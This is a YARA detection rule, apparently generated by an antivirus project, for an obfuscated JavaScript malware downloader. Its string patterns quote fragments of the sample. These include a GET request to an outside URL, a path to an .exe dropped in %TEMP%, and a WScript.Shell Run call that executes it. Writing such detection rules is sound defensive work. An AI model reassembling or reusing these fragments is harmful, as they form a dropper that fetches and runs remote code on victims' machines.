rule sig_20160328_9ed771c0d5347fcab8911fd3430d904c {
  meta:
    description = "datamaliciousorder - file 20160328_9ed771c0d5347fcab8911fd3430d904c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9a12895249695f35a3bb242fb6238662ddd6523e17c2e65e3edf96743c2bda39"

  strings:
    $s1  = "function Dcvwkglxbw() {return Ikvdbb[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Ek6X4w15.exe\";};" fullword ascii
    $s2  = "do {WScript[Vdbrtedygx](Rahqjx() * 11)} while (Jfzrtavop[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Ikvdbb = function Pfrwfbtckc() {return WScript[Ubwpjkdfrh](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Yspahxt(Isegohfe, Hnkgv){return Isegohfe - Hnkgv;};" fullword ascii
    $s5  = "Jfzrtavop[Qvupc](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s6  = "function Uowmslp(Ugjsav){Ikvdbb[\"Run\"](Ugjsav, Ygtyymp, Ygtyymp);};" fullword ascii
    $s7  = "function Bjzhgt() {return ((Uwhryjl == true) && (Uwhryjl == Xsfgdl)) ? 1 : Ygtyymp;};" fullword ascii
    $s8  = "function Xuzuzldv(){return Ubwpjkdfrh;};" fullword ascii
    $s9  = "Uwhryjl = true; " fullword ascii
    $s10 = "var Uwhryjl = false;" fullword ascii
    $s11 = "function Qxoiewkax()" fullword ascii
    $s12 = " while (Phfxsuiln){" fullword ascii
    $s13 = "var Iexyrd = false;" fullword ascii
    $s14 = "var Xsfgdl = false;" fullword ascii
    $s15 = "function Ncigco(Wbxrxxprc) {var Kvpzglz = (1, 2, 3, 4, 5, Wbxrxxprc); return Kvpzglz;};" fullword ascii
    $s16 = "Xsfgdl = true; " fullword ascii
    $s17 = "function Cgtlolfrmz(){return Vcubqxr;};" fullword ascii
    $s18 = "var Ygzhi = new this[\"Date\"]();" fullword ascii
    $s19 = "return Yspahxt(Xrldfhbwpt, Edawzts);" fullword ascii
    $s20 = "function Rahqjx(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}